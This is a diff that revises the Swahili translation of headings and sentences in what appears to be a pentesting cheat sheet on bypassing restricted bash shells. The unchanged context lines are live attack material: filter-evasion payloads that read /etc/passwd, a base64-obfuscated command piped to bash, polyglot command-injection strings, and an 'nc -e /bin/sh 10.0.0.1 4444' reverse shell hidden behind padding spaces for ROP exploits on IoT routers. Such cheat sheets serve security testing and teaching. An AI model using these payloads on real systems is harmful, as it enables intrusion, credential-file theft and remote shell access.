@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Pita nafasi zilizokatazwa
+### Pita maeneo yaliyokatazwa
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -110,7 +110,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass pipes
+### Pita mabomba
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -144,7 +144,7 @@ Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.
 
 ### Builtins
 
-Iwapo huwezi kutekeleza kazi za nje na una ufikiaji tu wa **seti ndogo ya builtins ili kupata RCE**, kuna mbinu kadhaa za kufanya hivyo. Kawaida **hutoweza kutumia zote** za **builtins**, hivyo unapaswa **kujua chaguzi zako zote** ili kujaribu kupita gerezani. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
+Iwapo huwezi kutekeleza kazi za nje na una ufikiaji tu wa **seti ndogo ya builtins kupata RCE**, kuna mbinu kadhaa za kufanya hivyo. Kawaida **hutoweza kutumia zote** za **builtins**, hivyo unapaswa **kujua chaguzi zako zote** ili kujaribu kupita gerezani. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
 Kwanza kabisa angalia zote [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hapa kuna baadhi ya **mapendekezo**:
 ```bash
 # Get list of builtins
@@ -197,7 +197,7 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### Polyglot command injection
+### Uingiliaji wa amri za polyglot
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
@@ -318,7 +318,7 @@ Hivyo unaweza kuunda *NOP sled kwa Bash* kwa kuweka amri yako halisi kwa mfululi
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ikiwa mnyororo wa ROP (au primitive yoyote ya uharibifu wa kumbukumbu) unatua kipanya cha maagizo popote ndani ya block ya nafasi, parser ya Bash inaruka tu nafasi za wazi hadi inafikia `nc`, ikitekeleza amri yako kwa uaminifu.
+Ikiwa mnyororo wa ROP (au primitive yoyote ya kuharibu kumbukumbu) unatua pointer ya maagizo mahali popote ndani ya block ya nafasi, parser ya Bash inaruka tu nafasi za wazi hadi inafikia `nc`, ikitekeleza amri yako kwa uaminifu.
 
 Matumizi halisi:
 
@@ -326,7 +326,7 @@ Matumizi halisi:
 2. Hali ambapo mshambuliaji hawezi kuandika bytes za NULL ili kuoanisha payload.
 3. Vifaa vilivyojumuishwa ambavyo vinaweza tu kutumia BusyBox `ash`/`sh` – pia vinapuuzilia mbali nafasi za mbele.
 
-> 🛠️  Changanya hila hii na ROP gadgets zinazopiga simu `system()` ili kuongeza kwa kiasi kikubwa uaminifu wa exploit kwenye route za IoT zenye ukosefu wa kumbukumbu.
+> 🛠️  Changanya hila hii na vifaa vya ROP vinavyopiga simu `system()` ili kuongeza kwa kiasi kikubwa uaminifu wa exploit kwenye route za IoT zenye ukosefu wa kumbukumbu.
 
 ## Marejeleo na Zaidi
 
